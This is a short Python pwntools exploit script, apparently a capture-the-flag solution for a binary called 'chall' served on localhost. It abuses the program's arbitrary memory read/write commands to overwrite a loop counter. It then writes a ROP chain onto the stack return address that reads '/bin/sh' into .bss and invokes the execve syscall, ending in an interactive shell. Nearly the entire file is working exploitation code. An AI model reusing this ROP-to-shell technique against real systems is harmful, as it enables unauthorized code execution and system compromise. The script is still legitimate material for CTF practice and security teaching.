from pwn import *

r = remote('localhost', 5000)
context.binary = exe = ELF('./chall')

def read(addr):
    r.sendline(b'r')
    r.sendline(hex(addr))
    r.recvuntil(hex(addr).encode() + b': ')
    return int(r.recvline(keepends=False), 16)

def write(addr, byte):
    r.sendline(b'w')
    r.sendline(hex(addr))
    r.sendline(hex(byte))
    return r.clean()

"""print(hex(read(0xc0000061c2)))
exit()"""
# might need to adjust this, uncomment the previous lines to leak the usual stack address
f_addr = 0xc00010cdb8
print(hex(f_addr))

# write to the variable i in the for loop
print(write(f_addr + 1, 0xff))

# adjust this too
ret_addr = 0xc00010cf48

rop = ROP(exe)
rop.raw(0x46b3e6)
rop.raw(0)
rop.raw(0x4224c4)
rop.raw(exe.bss(0x300))
rop.raw(0x41338f)
rop.raw(0x4224c4)
rop.raw(0)
rop.raw(0x46e7c6)
rop.raw(rop.find_gadget(['syscall', 'ret']))

rop.raw(0x46b3e6)
rop.raw(exe.bss(0x300))
rop.raw(0x4224c4)
rop.raw(0)
rop.raw(0x41338f)
rop.raw(0x412ac3)
rop.raw(0)
rop.raw(0x404846)
rop.raw(0x4224c4)
rop.raw(0x3b)
rop.raw(rop.find_gadget(['syscall', 'ret']))

chain = rop.chain()
for ind, i in enumerate(chain):
    write(ret_addr + ind, i)

print(write(f_addr + 1, 0))
print(write(f_addr, 0))

r.sendline(b'/bin/sh\0')

r.interactive()